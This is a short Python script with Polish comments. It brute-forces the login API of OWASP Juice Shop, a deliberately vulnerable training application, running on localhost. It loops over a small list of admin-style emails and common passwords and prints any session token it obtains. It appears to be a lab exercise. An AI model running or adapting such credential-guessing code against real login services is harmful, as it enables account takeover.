import requests
import time

#adres API logowania Juice Shop
LOGIN_URL = "http://localhost:3000/rest/user/login"

#przykładowe listy loginów i haseł do testu brute-force
usernames = ["admin@juice-sh.op", "admin@juice-shop.com", "user@example.com"]
passwords = ["admin123", "password", "letmein", "123456", "admin"]


def try_login(email, password):
    #dane do wysłania w zapytaniu POST (JSON)
    data = {
        "email": email,
        "password": password
    }
    #wysłanie żądania POST
    response = requests.post(LOGIN_URL, json=data)

    #jeśli status 200 i w odpowiedzi jest token, logowanie się powiodło
    if response.status_code == 200:
        json_resp = response.json()
        if "authentication" in json_resp and "token" in json_resp["authentication"]:
            return True, json_resp["authentication"]["token"]
    return False, None


def brute_force():
    for email in usernames:
        for password in passwords:
            print(f"Próbuję logować się jako: {email} z hasłem: {password}")
            success, token = try_login(email, password)
            if success:
                print(f"Zalogowano się jako {email} z hasłem {password}")
                print(f"Token: {token}")
                return  #zatrzymujemy po znalezieniu hasła
            else:
                print("Nieudana próba.")
            time.sleep(1)  #odstęp 1 sekundy, by nie obciążać serwera


if __name__ == "__main__":
    brute_force()
